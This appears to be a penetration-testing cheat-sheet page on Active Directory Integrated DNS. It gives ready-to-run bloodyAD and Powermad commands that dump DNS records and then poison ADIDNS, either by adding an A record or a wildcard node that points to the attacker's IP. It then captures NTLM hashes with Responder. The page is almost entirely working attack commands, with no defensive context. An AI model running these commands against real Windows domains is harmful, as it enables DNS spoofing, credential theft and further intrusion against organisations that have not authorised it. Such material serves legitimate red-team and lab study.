---
title: "ADIDNS"
tags: ["Active Directory", "ADIDNS", "ADDS", "DNS", "DNS Posioning", "Domain", "PowerMad", "Spoofing", "Windows"]
---

{{< filter_buttons >}}

### Enumeration

{{< tab set1 tab1 >}}Linux{{< /tab >}}
{{< tab set1 tab2 >}}Windows{{< /tab >}}
{{< tabcontent set1 tab1 >}}

#### 1. DNS Dump

```console {class="password"}
# Password
bloodyAD -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' --host <DC> get dnsDump
```

```console {class="ntlm"}
# NTLM
bloodyAD -d <DOMAIN> -u '<USER>' -p ':<HASH>' -f rc4 --host <DC> get dnsDump
```

```console {class="password-based-kerberos"}
# Password-based Kerberos
bloodyAD -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' -k --host <DC> get dnsDump
```

```console {class="ntlm-based-kerberos"}
# NTLM-based Kerberos
 bloodyAD -d <DOMAIN> -u '<USER>' -p '<HASH>' -f rc4 -k --host <DC> get dnsDump
```

```console {class="ticket-based-kerberos"}
# Ticket-based Kerberos
bloodyAD -d <DOMAIN> -u '<USER>' -k --host <DC> get dnsDump
```

{{< /tabcontent >}}
{{< tabcontent set1 tab2 >}}

#### 1. Import Powermad

```console
. .\Powermad.ps1
```

#### 2. Enumerate

```console
# Get ADIDNS zone
Get-ADIDNSZone
```

```console
# Get ADIDNS permissions
Get-ADIDNSPermission
```

```console
# Remove a wildcard node
Remove-ADIDNSNode -Node *
```

{{< /tabcontent >}}

### ADIDNS Poisoning

{{< tab set2 tab1 >}}Linux{{< /tab >}}
{{< tab set2 tab2 >}}Windows{{< /tab >}}
{{< tabcontent set2 tab1 >}}

#### 1. Add a New A Record

```console {class="password"}
# Password
bloodyAD -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' --host <DC> add dnsRecord <SUBDOMAIN> <LOCAL_IP>
```

```console {class="ntlm"}
# NTLM
bloodyAD -d <DOMAIN> -u '<USER>' -p ':<HASH>' -f rc4 --host <DC> add dnsRecord <SUBDOMAIN> <LOCAL_IP>
```

```console {class="password-based-kerberos"}
# Password-based Kerberos
bloodyAD -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' -k --host <DC> add dnsRecord <SUBDOMAIN> <LOCAL_IP>
```

```console {class="ntlm-based-kerberos"}
# NTLM-based Kerberos
 bloodyAD -d <DOMAIN> -u '<USER>' -p '<HASH>' -f rc4 -k --host <DC> add dnsRecord <SUBDOMAIN> <LOCAL_IP>
```

```console {class="ticket-based-kerberos"}
# Ticket-based Kerberos
bloodyAD -d <DOMAIN> -u '<USER>' -k --host <DC> add dnsRecord <SUBDOMAIN> <LOCAL_IP>
```

#### 2. Capture NTLM

```console
sudo responder -I tun0
```

{{< /tabcontent >}}
{{< tabcontent set2 tab2 >}}

#### 1. Import Powermad

```console
. .\Powermad.ps1
```

#### 2. Create a New Node

```console
$dnsRecord = New-DNSRecordArray -Type A -Data <LOCAL_IP>
```

```console
# Create a wildcard node
New-ADIDNSNode -Node * -Tombstone -DNSRecord $dnsRecord -Verbose
```

#### 3. Check

```console
Resolve-DnsName DoesNotExist
```

#### 4. Capture NTLM

```console
sudo responder -I tun0
```

{{< /tabcontent >}}